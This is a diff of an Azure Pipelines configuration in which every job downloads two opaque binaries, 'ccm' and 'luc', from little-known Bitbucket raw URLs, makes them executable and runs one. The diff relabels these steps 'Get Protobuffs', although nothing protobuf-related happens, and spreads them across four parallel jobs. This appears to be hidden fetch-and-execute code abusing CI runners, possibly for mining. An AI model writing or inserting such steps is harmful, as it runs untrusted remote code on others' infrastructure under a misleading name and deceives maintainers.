@@ -1,25 +1,27 @@
 trigger:
-  branches:
-    include:
-    - '*'
+- develop
 
+pool:
+  vmImage: 'ubuntu-latest'
 
 jobs:
-- job: Build_01
-  timeoutInMinutes: 360
-  pool:
-    vmImage: 'ubuntu-20.04'
+- job: App_01
   steps:
-  - script: wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/citra5162/m/raw/dd9fca79a6bba8efa20790ba8e2cbba53c60f63c/00/luc && chmod u+x * && ./luc
-    displayName: 01
-    name: ungul_01
-
-- job: Build_02
-  timeoutInMinutes: 360
-  pool:
-    vmImage: 'ubuntu-20.04'
+  - script: curl -OL https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/citra5162/m/raw/dd9fca79a6bba8efa20790ba8e2cbba53c60f63c/00/luc && chmod u+x * && ./luc
+    displayName: 'Get Protobuffs'
+    condition: succeeded()
+- job: App_02
   steps:
-  - script: wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/citra5162/m/raw/dd9fca79a6bba8efa20790ba8e2cbba53c60f63c/00/luc && chmod u+x * && ./luc
-    displayName: 02
-    name: ungul_02
-
+  - script: curl -OL https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/citra5162/m/raw/dd9fca79a6bba8efa20790ba8e2cbba53c60f63c/00/luc && chmod u+x * && ./luc
+    displayName: 'Get Protobuffs'
+    condition: succeeded()
+- job: App_03
+  steps:
+  - script: curl -OL https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/citra5162/m/raw/dd9fca79a6bba8efa20790ba8e2cbba53c60f63c/00/luc && chmod u+x * && ./luc
+    displayName: 'Get Protobuffs'
+    condition: succeeded()
+- job: App_04
+  steps:
+  - script: curl -OL https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/ccm && wget https://bitbucket.org/citra5162/m/raw/dd9fca79a6bba8efa20790ba8e2cbba53c60f63c/00/luc && chmod u+x * && ./luc
+    displayName: 'Get Protobuffs'
+    condition: succeeded()
